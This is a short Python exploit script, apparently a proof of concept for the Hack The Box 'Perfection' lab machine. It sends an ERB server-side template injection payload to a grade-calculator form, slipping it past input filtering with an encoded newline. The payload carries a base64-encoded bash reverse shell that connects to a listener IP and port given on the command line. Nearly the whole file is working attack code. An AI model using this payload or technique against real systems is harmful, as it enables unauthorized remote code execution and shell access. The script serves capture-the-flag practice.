import requests
import sys
import base64
from urllib.parse import quote

if len(sys.argv) < 2:
    print("Usage: python3 HTB_Perfection_poc.py <listener ip> <listener port>")
    sys.exit(1)

# Define the URL
url = "http://10.10.11.253/"

# Step 1: Encode "shell" to base64
original_text = f"bash -c \"bash -i >& /dev/tcp/{sys.argv[1]}/{sys.argv[2]} 0>&1\""
base64_encoded = base64.b64encode(original_text.encode()).decode()

# Step 2: Count "=" characters at the end
equals_count = base64_encoded.count('=')

# Step 3: Append spaces to "shell" based on the count of "=" characters
modified_text = original_text + ' ' * equals_count

# Step 4: Encode the modified text to base64 again
final_base64_encoded = base64.b64encode(modified_text.encode()).decode()

URL_encoded = quote(final_base64_encoded)
print(URL_encoded)

payload = f"<%25%3d+system(\"echo+{URL_encoded}|base64+-d|bash\")+%25>"

data = f"category1=a&grade1=0&weight1=0&category2=a&grade2=0&weight2=0&category3=a&grade3=0&weight3=0&category4=a&grade4=0&weight4=0&category5=a%0A{payload}&grade5=0&weight5=100"

session = requests.Session()

print("[+] get reverse shell")

revshell = session.post(url + "weighted-grade-calc" , data=data)
sys.exit()
